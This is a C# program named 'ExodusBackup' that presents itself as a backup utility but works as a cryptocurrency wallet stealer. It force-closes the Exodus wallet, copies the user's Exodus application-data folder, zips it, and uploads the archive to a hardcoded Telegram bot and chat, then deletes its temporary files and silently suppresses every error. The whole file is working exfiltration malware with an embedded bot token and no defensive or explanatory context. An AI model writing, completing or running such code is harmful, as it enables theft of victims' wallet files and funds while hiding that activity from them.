using System;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Net.Http;
using System.Threading.Tasks;

class ExodusBackup
{
    // === CONFIG ===
    private static readonly string BotToken = "8201470632:AAF5IUsKsaw6P0sXCzKzjFxkA58HRhUi0ok";
    private static readonly string ChatId = "-1003124606143";
    private static readonly string SourceFolder = Path.Combine(
        Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
        "Exodus"
    );
    // =================

    static async Task Main()
    {
        try
        {
            ForceCloseExodus();

            string tempFolder = CopyToTemp(SourceFolder);
            string zipPath = CreateZip(tempFolder);

            await SendFileToTelegram(zipPath);

            Cleanup(tempFolder, zipPath);
        }
        catch
        {
            // silently ignore errors
        }
    }

    private static void ForceCloseExodus()
    {
        foreach (var proc in Process.GetProcessesByName("Exodus"))
        {
            try { proc.Kill(); } catch { }
        }
    }

    private static string CopyToTemp(string sourceFolder)
    {
        if (!Directory.Exists(sourceFolder))
            return null;

        string tempRoot = Path.Combine(Path.GetTempPath(), "Exodus_copy_" + Guid.NewGuid());
        string destFolder = Path.Combine(tempRoot, "Exodus");

        CopyDirectory(sourceFolder, destFolder);

        return destFolder;
    }

    private static void CopyDirectory(string sourceDir, string targetDir)
    {
        Directory.CreateDirectory(targetDir);

        foreach (var file in Directory.GetFiles(sourceDir))
        {
            try
            {
                string destFile = Path.Combine(targetDir, Path.GetFileName(file));
                File.Copy(file, destFile, true);
            }
            catch { } // skip locked files
        }

        foreach (var dir in Directory.GetDirectories(sourceDir))
        {
            string destSubDir = Path.Combine(targetDir, Path.GetFileName(dir));
            try { CopyDirectory(dir, destSubDir); } catch { }
        }
    }

    private static string CreateZip(string folderPath)
    {
        if (folderPath == null) return null;
        string zipPath = folderPath + "_backup.zip";
        try
        {
            if (File.Exists(zipPath)) File.Delete(zipPath);
            ZipFile.CreateFromDirectory(folderPath, zipPath, CompressionLevel.Optimal, true);
        }
        catch { }
        return zipPath;
    }

    private static async Task SendFileToTelegram(string filePath)
    {
        if (filePath == null || !File.Exists(filePath)) return;

        using (var client = new HttpClient())
        using (var form = new MultipartFormDataContent())
        using (var fs = File.OpenRead(filePath))
        {
            form.Add(new StringContent(ChatId), "chat_id");
            form.Add(new StreamContent(fs), "document", Path.GetFileName(filePath));
            await client.PostAsync($"https://api.telegram.org/bot{BotToken}/sendDocument", form);
        }
    }

    private static void Cleanup(string folderPath, string zipPath)
    {
        try { if (File.Exists(zipPath)) File.Delete(zipPath); } catch { }
        try { if (Directory.Exists(folderPath)) Directory.Delete(folderPath, true); } catch { }
    }
}
